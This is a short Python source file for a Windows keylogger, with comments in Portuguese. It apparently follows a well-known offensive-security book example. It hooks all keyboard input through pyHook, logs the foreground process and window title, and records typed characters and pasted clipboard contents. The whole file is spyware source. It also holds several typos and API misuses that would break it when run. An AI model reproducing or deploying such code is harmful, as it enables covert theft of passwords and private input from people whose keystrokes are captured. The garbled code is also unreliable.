from ctypes import *
import pythoncom
import pyHook 
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():
    #obtem um handle para a janela em primeiro plano(foreground)
    hwnd = user32.GetForegroundWindow()

    #descobre o ID do processo
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    #armazena o ID do processo corrente
    process_id = "%d" % pid.value

    #obtem o executavel
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseName(h_process,None,byref(executable), 512)

    #agora le o seu titulo
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_tittle), 512)

    #exibe o cabeçalho se estivermos no processo correto
    print()
    print("[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
    print()

    #fecha os handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

def KeyStroke(event):

    global current_window

    #verifica se houve mudança na janela alvo
    if event.WindowName != current_window:
        current_window = event.WindowName()
        get_current_process()

    
    #se uma tecla-padrão foi pressionada
    if event.Ascii > 32 and event.Ascci < 127:
        print(chr(event.Ascii))
    else:
        if event.key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print("[PASTE] - %s" % (pasted_value),)

        else:
            print("[%s]" % event.Key,)

    #passa a execução para o proximo hook registrado
    return True

#cria e registra um gerenciador de hooks
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

# registra o hook e executa indefinidamente
kl.HookKeyboard()
pythoncom.PumpMessages()

